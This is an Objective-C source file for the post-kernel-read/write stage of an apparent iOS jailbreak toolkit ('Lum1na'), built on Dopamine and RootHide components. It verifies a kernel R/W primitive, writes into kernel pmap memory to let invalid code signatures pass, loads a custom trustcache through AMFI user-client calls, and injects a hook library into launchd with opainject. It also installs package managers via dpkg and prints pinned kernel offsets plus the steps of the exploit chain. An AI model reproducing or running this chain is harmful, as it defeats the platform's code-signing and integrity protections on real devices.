#import "Lum1naAfterKread.h"
#import "Lum1naBoard.h"
#import "LabLocalTime.h"
#import "LabRuntimeOffsets.h"
#import "Lum1naSocketKRW.h"
#import "P06xLog.h"

#import <IOKit/IOKitLib.h>
#import <string.h>
#import <stdio.h>
#import <uuid/uuid.h>
#import <stdarg.h>
#import <spawn.h>
#import <sys/wait.h>
#import <errno.h>

#ifndef MH_MAGIC_64
#define MH_MAGIC_64 0xfeedfacf
#endif

extern char **environ;

#define AK_TAG @"afterkread"
#define LUM_CDHASH_LEN 20

typedef struct {
    uint8_t hash[LUM_CDHASH_LEN];
    uint8_t hash_type;
    uint8_t flags;
} __attribute__((packed)) lum_tc_entry_v1;

typedef struct {
    uint32_t version;
    uuid_t uuid;
    uint32_t length;
    lum_tc_entry_v1 entries[];
} __attribute__((packed)) lum_tc_file_v1;

static void ak_log(NSMutableString *s, NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [s appendFormat:@"%@\n", line];
    P06xLog(AK_TAG, line);
}

static NSArray<NSString *> *ak_basebinNames(void) {
    // Dopamine 3.0.10 BaseBin/ + Relaxin 0.5.4 RootHide payload names.
    // Drop into Documents/basebin. Do not copy Dopamine kfd/ClearSword.
    return @[
        @"basebin.tc",
        @"basebin.tar",
        @"trustcache",
        @"jbctl",
        @"launchdhook.dylib",
        @"systemhook.dylib",
        @"watchdoghook.dylib",
        @"dyldhook.dylib",
        @"forkfix.dylib",
        @"hookd",
        @"opainject",
        @"libjailbreak.dylib",
        @"rootlesshooks",
        @"TweakLoader.dylib",
        @"libellekit.dylib",
        @"CydiaSubstrate",
        @"Relaxin.roothide",
    ];
}

static NSArray<NSString *> *ak_tweakDylibs(void) {
    NSMutableArray *out = [NSMutableArray array];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (!docs) return out;
    NSString *tweaks = [docs stringByAppendingPathComponent:@"tweaks"];
    NSArray<NSString *> *names = [[NSFileManager defaultManager]
                                  contentsOfDirectoryAtPath:tweaks error:nil];
    for (NSString *n in names) {
        if ([n.pathExtension.lowercaseString isEqualToString:@"dylib"] ||
            [n.pathExtension.lowercaseString isEqualToString:@"deb"]) {
            [out addObject:[tweaks stringByAppendingPathComponent:n]];
        }
    }
    return out;
}

static NSArray<NSString *> *ak_searchRoots(void) {
    NSMutableArray *roots = [NSMutableArray array];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (docs) {
        [roots addObject:docs];
        [roots addObject:[docs stringByAppendingPathComponent:@"basebin"]];
        [roots addObject:[docs stringByAppendingPathComponent:@"tweaks"]];
        [roots addObject:[docs stringByAppendingPathComponent:@"pkgman"]];
    }
    NSString *bundle = [[NSBundle mainBundle] resourcePath];
    if (bundle) {
        [roots addObject:bundle];
        [roots addObject:[bundle stringByAppendingPathComponent:@"basebin"]];
        [roots addObject:[bundle stringByAppendingPathComponent:@"pkgman"]];
    }
    NSString *appRoot = [[NSBundle mainBundle] bundlePath];
    if (appRoot && ![appRoot isEqualToString:bundle]) {
        [roots addObject:appRoot];
        [roots addObject:[appRoot stringByAppendingPathComponent:@"basebin"]];
    }
    return roots;
}

static NSString *ak_findFile(NSString *name) {
    for (NSString *root in ak_searchRoots()) {
        NSString *path = [root stringByAppendingPathComponent:name];
        if ([[NSFileManager defaultManager] fileExistsAtPath:path]) return path;
    }
    NSString *base = name.stringByDeletingPathExtension;
    NSString *ext = name.pathExtension;
    NSString *res = [[NSBundle mainBundle] pathForResource:base
                                                    ofType:ext.length ? ext : nil];
    if (res && [[NSFileManager defaultManager] fileExistsAtPath:res]) return res;
    return nil;
}

static uint64_t ak_tarOctal(const char *s, size_t n) {
    uint64_t v = 0;
    for (size_t i = 0; i < n; i++) {
        unsigned char c = (unsigned char)s[i];
        if (c == 0 || c == ' ') continue;
        if (c < '0' || c > '7') break;
        v = (v << 3) | (uint64_t)(c - '0');
    }
    return v;
}

static BOOL ak_safeRelPath(const char *name) {
    if (!name || !name[0]) return NO;
    if (name[0] == '/') return NO;
    if (strstr(name, "..")) return NO;
    return YES;
}

/* Minimal ustar extract of Dopamine/Relaxin basebin.tar into destDir.
   Entries are typically "basebin/launchdhook.dylib". */
static BOOL ak_extractUstar(NSData *tar, NSString *destDir, NSMutableString *s) {
    if (tar.length < 512) return NO;
    const uint8_t *p = tar.bytes;
    size_t n = tar.length;
    size_t off = 0;
    uint32_t files = 0;
    NSFileManager *fm = [NSFileManager defaultManager];
    char gnuLong[512];
    gnuLong[0] = 0;

    while (off + 512 <= n) {
        const char *hdr = (const char *)(p + off);
        int empty = 1;
        for (int i = 0; i < 512; i++) if (hdr[i]) { empty = 0; break; }
        if (empty) break;

        char type = hdr[156];
        uint64_t size = ak_tarOctal(hdr + 124, 12);
        off += 512;
        size_t dataOff = off;
        size_t padded = (size + 511u) & ~511u;
        if (off + padded > n && off + size > n) break;

        if (type == 'L' || type == 'K') {
            size_t copy = size < sizeof(gnuLong) - 1 ? (size_t)size : sizeof(gnuLong) - 1;
            memcpy(gnuLong, p + dataOff, copy);
            gnuLong[copy] = 0;
            off += padded;
            continue;
        }

        char namebuf[320];
        memset(namebuf, 0, sizeof(namebuf));
        if (gnuLong[0]) {
            strncpy(namebuf, gnuLong, sizeof(namebuf) - 1);
            gnuLong[0] = 0;
        } else {
            char prefix[156];
            memset(prefix, 0, sizeof(prefix));
            memcpy(prefix, hdr + 345, 155);
            if (prefix[0]) {
                snprintf(namebuf, sizeof(namebuf), "%s/%s", prefix, hdr);
            } else {
                memcpy(namebuf, hdr, 100);
            }
        }
        if (!ak_safeRelPath(namebuf)) {
            off += padded;
            continue;
        }

        const char *rel = namebuf;
        if (strncmp(rel, "basebin/", 8) == 0) rel += 8;
        if (!rel[0] || strcmp(rel, ".") == 0) {
            off += padded;
            continue;
        }

        NSString *outPath = [destDir stringByAppendingPathComponent:
                             [NSString stringWithUTF8String:rel]];
        size_t relLen = strlen(rel);
        if (type == '5' || (relLen && rel[relLen - 1] == '/')) {
            [fm createDirectoryAtPath:outPath withIntermediateDirectories:YES attributes:nil error:nil];
            off += padded;
            continue;
        }
        if (type != '0' && type != '\0') {
            off += padded;
            continue;
        }

        NSString *parent = [outPath stringByDeletingLastPathComponent];
        [fm createDirectoryAtPath:parent withIntermediateDirectories:YES attributes:nil error:nil];
        NSData *blob = [NSData dataWithBytes:p + dataOff length:(NSUInteger)size];
        if ([blob writeToFile:outPath atomically:YES]) {
            files++;
            uint64_t mode = ak_tarOctal(hdr + 100, 8);
            if (mode) {
                [fm setAttributes:@{ NSFilePosixPermissions: @(mode & 0777) }
                     ofItemAtPath:outPath error:nil];
            }
        }
        off += padded;
    }
    ak_log(s, @"[*] extracted %u files from basebin.tar into %@", files, destDir);
    return files > 0;
}

static void ak_alias(NSString *from, NSString *to, NSMutableString *s) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:from]) return;
    if ([fm fileExistsAtPath:to]) return;
    NSError *err = nil;
    if ([fm copyItemAtPath:from toPath:to error:&err]) {
        ak_log(s, @"[*] alias %@ -> %@", from.lastPathComponent, to.lastPathComponent);
    }
}

static void ak_stageBundledBasebin(NSMutableString *s) {
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (!docs) return;
    NSString *dest = [docs stringByAppendingPathComponent:@"basebin"];
    NSString *tweaksDest = [docs stringByAppendingPathComponent:@"tweaks"];
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:dest withIntermediateDirectories:YES attributes:nil error:nil];
    [fm createDirectoryAtPath:tweaksDest withIntermediateDirectories:YES attributes:nil error:nil];

    NSString *bundleTweaks = [[[NSBundle mainBundle] resourcePath]
                              stringByAppendingPathComponent:@"tweaks"];
    NSString *pkgDest = [docs stringByAppendingPathComponent:@"pkgman"];
    [fm createDirectoryAtPath:pkgDest withIntermediateDirectories:YES attributes:nil error:nil];

    ak_log(s, @"[*] staging bundled BaseBin -> Documents/basebin");
    ak_log(s, @"[*] credit: Dopamine 3.0.10 (opa334, MIT) + Relaxin 0.5.4 RootHide/ElleKit");
    ak_log(s, @"[*] pkgman: Sileo first, Zebra second (Dopamine 3 bundled debs). dpkg after KRW.");
    ak_log(s, @"[*] not copied: kfd / ClearSword / physrw / Fugu14 kcall / bootstrap zst");

    NSArray<NSString *> *copyNames = @[
        @"basebin.tar", @"basebin.tc", @"relaxin.tc",
        @"Relaxin.roothide", @"CREDITS.md",
        @"LICENSE_Dopamine.md", @"LICENSE_ElleKit.md", @"LICENSE_opainject.md",
        @"LICENSE_Sileo.md", @"LICENSE_Zebra.md",
    ];
    for (NSString *name in copyNames) {
        NSString *src = ak_findFile(name);
        if (!src) continue;
        NSString *dst = [dest stringByAppendingPathComponent:name];
        if ([src isEqualToString:dst]) continue;
        if ([fm fileExistsAtPath:dst]) continue;
        NSError *err = nil;
        [fm copyItemAtPath:src toPath:dst error:&err];
        ak_log(s, @"    copy %@ <- %@ (%@)", name, src.lastPathComponent,
               err ? err.localizedDescription : @"ok");
    }

    NSArray<NSString *> *pkgNames = @[ @"sileo.deb", @"zebra.deb",
                                       @"LICENSE_Sileo.md", @"LICENSE_Zebra.md" ];
    for (NSString *name in pkgNames) {
        NSString *src = ak_findFile(name);
        if (!src) continue;
        NSString *dst = [pkgDest stringByAppendingPathComponent:name];
        if ([src isEqualToString:dst]) continue;
        if ([fm fileExistsAtPath:dst]) continue;
        NSError *err = nil;
        [fm copyItemAtPath:src toPath:dst error:&err];
        ak_log(s, @"    pkgman %@ (%@)", name, err ? err.localizedDescription : @"ok");
    }

    NSString *tarPath = [dest stringByAppendingPathComponent:@"basebin.tar"];
    if (![fm fileExistsAtPath:tarPath]) tarPath = ak_findFile(@"basebin.tar");
    NSString *already = [dest stringByAppendingPathComponent:@"launchdhook.dylib"];
    NSData *tar = tarPath ? [NSData dataWithContentsOfFile:tarPath] : nil;
    if ([fm fileExistsAtPath:already]) {
        ak_log(s, @"[*] Documents/basebin already extracted (launchdhook present)");
    } else if (tar) {
        ak_log(s, @"[*] extracting %@ (%lu bytes)", tarPath, (unsigned long)tar.length);
        ak_extractUstar(tar, dest, s);
    }
    if (![fm fileExistsAtPath:already] && !tar) {
        ak_log(s, @"[-] no basebin.tar — looked App.app/, App.app/basebin/, Documents/basebin");
    }
    ak_alias([dest stringByAppendingPathComponent:@"dyldhook_merge.arm64e.iOS18+.dylib"],
             [dest stringByAppendingPathComponent:@"dyldhook.dylib"], s);
    ak_alias([dest stringByAppendingPathComponent:@"dyldhook_merge.arm64.iOS18+.dylib"],
             [dest stringByAppendingPathComponent:@"dyldhook.dylib"], s);
    NSString *elle = [dest stringByAppendingPathComponent:
                      @"fallback/CydiaSubstrate.framework/CydiaSubstrate"];
    ak_alias(elle, [dest stringByAppendingPathComponent:@"CydiaSubstrate"], s);
    ak_alias(elle, [dest stringByAppendingPathComponent:@"TweakLoader.dylib"], s);
    ak_alias(elle, [dest stringByAppendingPathComponent:@"libellekit.dylib"], s);
    ak_alias([dest stringByAppendingPathComponent:@"rootlesshooks.dylib"],
             [dest stringByAppendingPathComponent:@"rootlesshooks"], s);

    for (NSString *bin in @[ @"opainject", @"jbctl", @"hookd" ]) {
        NSString *p = [dest stringByAppendingPathComponent:bin];
        if (![fm fileExistsAtPath:p]) continue;
        [fm setAttributes:@{ NSFilePosixPermissions: @0755 } ofItemAtPath:p error:nil];
    }

    if ([fm fileExistsAtPath:bundleTweaks]) {
        NSArray *tnames = [fm contentsOfDirectoryAtPath:bundleTweaks error:nil];
        for (NSString *n in tnames) {
            if ([n hasPrefix:@"."]) continue;
            NSString *src = [bundleTweaks stringByAppendingPathComponent:n];
            NSString *dst = [tweaksDest stringByAppendingPathComponent:n];
            if ([fm fileExistsAtPath:dst]) continue;
            [fm copyItemAtPath:src toPath:dst error:nil];
        }
    }
}

static NSData *ak_loadTrustcacheBlob(NSMutableString *s) {
    NSString *path = ak_findFile(@"basebin.tc");
    if (!path) {
        ak_log(s, @"[*] no basebin.tc in Documents/basebin, Documents, or bundle");
        return nil;
    }
    NSData *data = [NSData dataWithContentsOfFile:path];
    ak_log(s, @"[*] loaded %@ (%lu bytes)", path, (unsigned long)data.length);
    if (data.length < sizeof(uint32_t) * 2 + sizeof(uuid_t)) {
        ak_log(s, @"[-] basebin.tc too small for trustcache_file_v1");
        return nil;
    }
    const lum_tc_file_v1 *tc = (const lum_tc_file_v1 *)data.bytes;
    ak_log(s, @"[*] tc version=%u length=%u (Dopamine v1 layout)", tc->version, tc->length);
    return data;
}

static io_connect_t ak_openAMFI(NSMutableString *s) {
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleMobileFileIntegrity"));
    if (!svc) {
        ak_log(s, @"[-] AppleMobileFileIntegrity service missing");
        return 0;
    }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    ak_log(s, @"[*] AMFI IOServiceOpen type=0 kr=0x%x conn=%u", kr, (unsigned)conn);
    if (kr != KERN_SUCCESS) return 0;
    return conn;
}

static void ak_printKRWSteps(NSMutableString *s) {
    ak_log(s, @"KRW remaining (do not skip):");
    ak_log(s, @"  1 aio84530 heap leak (live A14+A12X) — fill seed, not inpcb");
    ak_log(s, @"  2 43748 fill into fat type-3 OOL kdata (A14 occupancy live; G71 fill_cap SKIP)");
    ak_log(s, @"  3 SocketKRW Adopt+Arm of smashed pair → VerifyPrimitive R/W round-trip");
    ak_log(s, @"  4 kread leaked object's vtable → text VA → slide");
    ak_log(s, @"  5 board.commitSlide: kread(kbase)==MH_MAGIC_64 and kbase+0x1c is a kptr");
    ak_log(s, @"  6 this slot: pmap_cs, AMFI TC, opainject launchdhook, Sileo then Zebra, respring");
}

static int ak_spawn(NSString *path, NSArray<NSString *> *args, NSMutableString *s) {
    if (!path.length) {
        ak_log(s, @"[-] spawn miss (nil path)");
        return -1;
    }
    if (![[NSFileManager defaultManager] isExecutableFileAtPath:path] &&
        ![[NSFileManager defaultManager] fileExistsAtPath:path]) {
        ak_log(s, @"[-] spawn miss %@", path);
        return -1;
    }
    NSMutableArray<NSString *> *argv = [NSMutableArray arrayWithObject:path];
    if (args.count) [argv addObjectsFromArray:args];
    NSUInteger n = argv.count;
    char **cargv = calloc(n + 1, sizeof(char *));
    if (!cargv) return -1;
    for (NSUInteger i = 0; i < n; i++) {
        cargv[i] = (char *)argv[i].fileSystemRepresentation;
    }
    pid_t pid = 0;
    int rc = posix_spawn(&pid, path.fileSystemRepresentation, NULL, NULL, cargv, environ);
    free(cargv);
    if (rc != 0) {
        ak_log(s, @"[-] posix_spawn %@ rc=%d (%s)", path.lastPathComponent, rc, strerror(rc));
        return rc;
    }
    int st = 0;
    waitpid(pid, &st, 0);
    int code = WIFEXITED(st) ? WEXITSTATUS(st) : (WIFSIGNALED(st) ? 128 + WTERMSIG(st) : -1);
    ak_log(s, @"[*] spawn %@ pid=%d exit=%d", path.lastPathComponent, pid, code);
    return code;
}

/* True KRW test: Mach-O magic at kbase, then kbase+0x1c is a kernel VA.
   Heap leaks and blit 0xA5 do not pass. */
static BOOL ak_krwSelfTest(NSMutableString *s) {
    Lum1naBoard *b = [Lum1naBoard shared];
    Lum1naSocketKRWContext *ctx = (Lum1naSocketKRWContext *)b.krwContext;
    if (!b.hasKread || !ctx) {
        ak_log(s, @"[-] KRW test SKIP — hasKread=%@ ctx=%p",
               b.hasKread ? @"YES" : @"NO", ctx);
        ak_printKRWSteps(s);
        return NO;
    }
    uint64_t kbase = b.kbase ? b.kbase : ctx->kbase;
    if (!kbase) {
        ak_log(s, @"[-] KRW test SKIP — kbase=0");
        return NO;
    }
    uint32_t magic = Lum1naSocketKRW_KRead32(ctx, kbase);
    ak_log(s, @"[*] KRW test kread32(kbase=0x%llx)=0x%08x (want MH_MAGIC_64 0xfeedfacf)",
           (unsigned long long)kbase, magic);
    if (magic != MH_MAGIC_64) {
        ak_log(s, @"[-] KRW test FAIL — kbase is not a Mach-O. hasKread is a lie; refuse inject.");
        return NO;
    }
    uint64_t vptr = Lum1naSocketKRW_KRead64(ctx, kbase + 0x1c);
    ak_log(s, @"[*] KRW test kread64(kbase+0x1c)=0x%llx", (unsigned long long)vptr);
    if (vptr < 0xFFFFFF8000000000ULL) {
        ak_log(s, @"[-] KRW test FAIL — kbase+0x1c is not a kernel VA");
        return NO;
    }
    uint8_t buf[16] = {0};
    if (Lum1naSocketKRW_KReadBuf(ctx, vptr, buf, sizeof(buf))) {
        ak_log(s, @"[*] KRW test version bytes %02x %02x %02x %02x %02x %02x %02x %02x",
               buf[0], buf[1], buf[2], buf[3], buf[4], buf[5], buf[6], buf[7]);
    }
    ak_log(s, @"[+] KRW test PASS — Mach-O magic + version ptr. Injection may fire.");
    return YES;
}

static void ak_tryInject(NSMutableString *s) {
    NSString *opainject = ak_findFile(@"opainject");
    NSString *launchdhook = ak_findFile(@"launchdhook.dylib");
    if (!opainject || !launchdhook) {
        ak_log(s, @"[-] inject SKIP — opainject=%@ launchdhook=%@",
               opainject.lastPathComponent ?: @"(missing)",
               launchdhook.lastPathComponent ?: @"(missing)");
        return;
    }
    ak_log(s, @"[*] inject: opainject 1 (launchd) %@", launchdhook.lastPathComponent);
    ak_spawn(opainject, @[ @"1", launchdhook ], s);
    NSArray<NSString *> *tweaks = ak_tweakDylibs();
    if (tweaks.count == 0) {
        ak_log(s, @"[*] Documents/tweaks empty — TweakLoader has nothing to load this respring");
        return;
    }
    ak_log(s, @"[*] %lu tweak dylib(s) staged for ElleKit TweakLoader after respring",
           (unsigned long)tweaks.count);
}

static void ak_tryRespring(NSMutableString *s) {
    NSString *jbctl = ak_findFile(@"jbctl");
    if (jbctl) {
        ak_log(s, @"[*] respring via jbctl (Dopamine 3 name: sbreload / backboardd SIGTERM)");
        int rc = ak_spawn(jbctl, @[ @"respring" ], s);
        if (rc == 0) return;
    }
    ak_log(s, @"[*] respring fallback: killall -9 backboardd (sandbox will deny until unsandboxed)");
    ak_spawn(@"/usr/bin/killall", @[ @"-9", @"backboardd" ], s);
}

static void ak_tryInstallPkgman(NSMutableString *s) {
    /* Sileo first, Zebra second — same debs Dopamine 3.0.10 ships. dpkg lives
       in Procursus bootstrap (bootstrap zst is NOT copied). */
    NSArray<NSDictionary *> *pkgs = @[
        @{ @"file": @"sileo.deb", @"name": @"Sileo" },
        @{ @"file": @"zebra.deb", @"name": @"Zebra" },
    ];
    NSString *dpkg = nil;
    NSArray<NSString *> *cands = @[
        @"/var/jb/usr/bin/dpkg",
        @"/var/containers/Bundle/Application/.jbroot/usr/bin/dpkg",
        @"/usr/bin/dpkg",
    ];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (docs) {
        NSMutableArray *m = [cands mutableCopy];
        [m addObject:[docs stringByAppendingPathComponent:@"basebin/usr/bin/dpkg"]];
        cands = m;
    }
    for (NSString *p in cands) {
        if ([[NSFileManager defaultManager] isExecutableFileAtPath:p]) { dpkg = p; break; }
    }
    for (NSDictionary *pkg in pkgs) {
        NSString *deb = ak_findFile(pkg[@"file"]);
        ak_log(s, @"[*] pkgman %@ %@%@",
               pkg[@"name"],
               deb ? deb : @"(deb missing — drop into Documents/pkgman)",
               [pkg[@"name"] isEqualToString:@"Sileo"] ? @" (first)" : @"");
        if (!deb) continue;
        if (!dpkg) {
            ak_log(s, @"[*]   staged. dpkg missing until Procursus bootstrap after KRW.");
            continue;
        }
        ak_log(s, @"[*]   dpkg -i %@", deb.lastPathComponent);
        ak_spawn(dpkg, @[ @"-i", deb ], s);
    }
}

@implementation Lum1naAfterKread

+ (NSString *)plan {
    const LabOffTab *off = LabOff();
    const char *tag = (off && off->tag) ? off->tag : "?";
    NSMutableString *s = [NSMutableString string];
    [s appendString:
     @"LUM1NA CONSTELLATION (Dopamine 3.0.10 BaseBin + Relaxin/RootHide names):\n"
     @"  KRW test: kread32(kbase)==MH_MAGIC_64 and kbase+0x1c is a kernel VA.\n"
     @"  0 HOLD until that test via board.commitSlide.\n"
     @"  1 pmap_cs_allow_invalid *(pmap+0xca)=1 (A14 PPL; not momentarius).\n"
     @"  2 AMFI UC loadTrustCache sel 2/7 of Documents/basebin/basebin.tc.\n"
     @"  3 trustcache launchdhook/systemhook/dyldhook/watchdoghook/forkfix.\n"
     @"  4 inject via opainject 1 launchdhook + ElleKit TweakLoader.\n"
     @"  5 package managers: Sileo first, then Zebra (Documents/pkgman/*.deb).\n"
     @"  6 respring: jbctl respring (sbreload / backboardd SIGTERM).\n"
     @"  7 persist/tempRoot/boot-rejailbreak stay HOLD — novel Lum1na, later.\n"];
    if (!off) {
        [s appendString:@"HOLD: LabOff() is NULL (unknown SKU). AMFI/pmap pins unfired.\n"];
    } else if (off->tag && strcmp(off->tag, "A12X_23G71") == 0) {
        [s appendString:@"A12X 23G71 = no SPTM. momentarius is PPL-on-KRW, not a kernel slot.\n"];
        [s appendFormat:@"T8020 pins (unslid) tag %s:\n", tag];
        [s appendFormat:@"  AMFIUserClient_externalMethod  0x%llx\n", off->amfi_external];
        [s appendFormat:@"  loadTrustCache                 0x%llx  sel %u / %u\n",
         off->amfi_loadtc, off->amfi_sel_copy, off->amfi_sel_manifest];
        [s appendFormat:@"  pmap_cs_allow_invalid_internal 0x%llx  *(pmap+0x%x)=1\n",
         off->pmap_cs_allow, off->pmap_cs_allow_off];
        [s appendString:@"  pmap_load_trust_cache          (cstring absent — not pinned)\n"];
        [s appendFormat:@"  aks_wvek                       0x%llx\n", off->aks_wvek_overflow];
        [s appendString:@"  owns_replaceable               present (twin 23G71)\n"];
    } else {
        [s appendString:@"A14 = PPL. pmap_cs_allow_invalid + AMFI UC sel 2/7 from the same process.\n"];
        [s appendFormat:@"23F77 pins (unslid) tag %s Ghidra 2026-09-29:\n", tag];
        [s appendFormat:@"  AMFIUserClient_externalMethod  0x%llx\n", off->amfi_external];
        [s appendFormat:@"  loadTrustCache                 0x%llx  sel %u / %u\n",
         off->amfi_loadtc, off->amfi_sel_copy, off->amfi_sel_manifest];
        [s appendFormat:@"  pmap_cs_allow_invalid_internal 0x%llx  *(pmap+0x%x)=1\n",
         off->pmap_cs_allow, off->pmap_cs_allow_off];
        [s appendFormat:@"  pmap_load_trust_cache          0x%llx\n", off->pmap_load_tc];
        [s appendString:@"  owns_replaceable               ABSENT (detach bit + size only)\n"];
        [s appendString:@"  EncType_Max                    PRESENT; session-mismatch ABSENT\n"];
    }
    return s;
}

+ (NSString *)tap {
    P06xLogBegin(AK_TAG);
    NSMutableString *s = [NSMutableString string];
    Lum1naBoard *b = [Lum1naBoard shared];
    const LabOffTab *off = LabOff();

    ak_log(s, @"=== After-Kread %@ ===", LabLocalMilitaryNow() ?: @"?");
    ak_log(s, @"hasKread=%@ hasKwrite=%@ leaks=%lu sku=%@ kslide=0x%llx",
           b.hasKread ? @"YES" : @"NO",
           b.hasKwrite ? @"YES" : @"NO",
           (unsigned long)b.leaks.count,
           b.sku ?: @"?",
           (unsigned long long)b.kslide);
    [s appendString:[self plan]];
    P06xLog(AK_TAG, @"plan dumped");

    ak_stageBundledBasebin(s);

    ak_log(s, @"[*] Dopamine 3.0.10 / Relaxin-RootHide names this slot consumes after hasKread:");
    for (NSString *name in ak_basebinNames()) {
        NSString *path = ak_findFile(name);
        ak_log(s, @"    %-22s %@", name.UTF8String, path ?: @"(missing)");
    }
    NSArray<NSString *> *tweaks = ak_tweakDylibs();
    if (tweaks.count == 0) {
        ak_log(s, @"[*] Documents/tweaks empty — drop dylibs here for first injection");
    } else {
        ak_log(s, @"[*] Documents/tweaks (%lu):", (unsigned long)tweaks.count);
        for (NSString *p in tweaks) {
            ak_log(s, @"    %@", p.lastPathComponent);
        }
    }

    io_connect_t conn = ak_openAMFI(s);
    if (conn) {
        ak_log(s, @"[+] AMFI user client open — reach OK");
        IOServiceClose(conn);
        conn = 0;
    }

    ak_log(s, @"[*] pkgman inventory (Sileo first):");
    for (NSString *name in @[ @"sileo.deb", @"zebra.deb" ]) {
        NSString *path = ak_findFile(name);
        ak_log(s, @"    %-12s %@", name.UTF8String, path ?: @"(missing — Resources/pkgman)");
    }

    if (!b.hasKread) {
        ak_log(s, @"HOLD: no kreadbuf. AMFI sel 2/7, pmap_cs, opainject, dpkg, respring unfired.");
        ak_log(s, @"Bundled BaseBin + Sileo/Zebra debs are staged. Files present ≠ injection.");
        ak_printKRWSteps(s);
        ak_log(s, @"Re-tap after LightSword or P044 commitSlide. persist/tempRoot stay later.");
        [[Lum1naBoard shared] recordEvent:@"afterkread"
                                     kind:@"hold"
                                   detail:@"hasKread=NO"
                                   source:@"afterkread"];
        NSString *body = P06xLogDump(AK_TAG);
        return body.length ? body : s;
    }

    if (!ak_krwSelfTest(s)) {
        ak_log(s, @"HOLD: KRW self-test failed. Injection/respring/Sileo stay unfired.");
        [[Lum1naBoard shared] recordEvent:@"afterkread"
                                     kind:@"hold"
                                   detail:@"krw-test-fail"
                                   source:@"afterkread"];
        NSString *body = P06xLogDump(AK_TAG);
        return body.length ? body : s;
    }

    if (!off) {
        ak_log(s, @"HOLD: LabOff() NULL — refuse AMFI/pmap fire (no A14-macro fallback).");
        [[Lum1naBoard shared] recordEvent:@"afterkread"
                                     kind:@"hold"
                                   detail:@"laboff-null"
                                   source:@"afterkread"];
        NSString *body = P06xLogDump(AK_TAG);
        return body.length ? body : s;
    }

    ak_log(s, @"FIRING: KRW test PASS — Dopamine-shaped AMFI/pmap_cs + inject + Sileo + respring");
    [[Lum1naBoard shared] recordEvent:@"afterkread"
                                 kind:@"fire"
                               detail:@"hasKread=YES"
                               source:@"afterkread"];

    uint32_t selCopy = off->amfi_sel_copy;
    uint32_t selManifest = off->amfi_sel_manifest;
    uint32_t pmapOff = off->pmap_cs_allow_off ? off->pmap_cs_allow_off : LabPmapCsAllowOff();

    uint64_t pmapVA = 0;
    for (NSDictionary *e in b.leaks) {
        if (![e isKindOfClass:[NSDictionary class]]) continue;
        if (![e[@"kind"] isEqualToString:@"pmap"]) continue;
        pmapVA = strtoull([[e[@"va"] description] UTF8String], NULL, 16);
        if (pmapVA) break;
    }
    if (pmapVA && b.krwContext) {
        uint64_t addr = pmapVA + pmapOff;
        ak_log(s, @"[*] pmap_cs poke *(0x%llx)=1 (pmap+0x%x)", (unsigned long long)addr, pmapOff);
        bool ok = Lum1naSocketKRW_KWrite8((Lum1naSocketKRWContext *)b.krwContext, addr, 1);
        ak_log(s, @"[%@] pmap_cs KWrite8", ok ? @"+" : @"-");
    } else {
        ak_log(s, @"[*] pmap poke waits for a leaks[] row kind=pmap (pmap kva still unknown)");
    }

    NSData *tc = ak_loadTrustcacheBlob(s);
    conn = ak_openAMFI(s);
    if (conn && tc) {
        kern_return_t kr = IOConnectCallMethod(conn, selCopy,
                                               NULL, 0,
                                               tc.bytes, tc.length,
                                               NULL, NULL, NULL, NULL);
        ak_log(s, @"[*] AMFI loadTrustCache sel %u (copy) kr=0x%x", selCopy, kr);
        kr = IOConnectCallMethod(conn, selManifest,
                                 NULL, 0,
                                 tc.bytes, tc.length,
                                 NULL, NULL, NULL, NULL);
        ak_log(s, @"[*] AMFI loadTrustCache sel %u (manifest) kr=0x%x", selManifest, kr);
        IOServiceClose(conn);
    } else if (conn) {
        ak_log(s, @"[*] AMFI open with no basebin.tc — sel 2/7 not called");
        IOServiceClose(conn);
    }

    ak_tryInject(s);
    ak_tryInstallPkgman(s);
    ak_tryRespring(s);
    ak_log(s, @"[*] persist/tempRoot/boot-rejailbreak HOLD — first injection is this slot, novel later.");
    NSString *body = P06xLogDump(AK_TAG);
    return body.length ? body : s;
}

@end
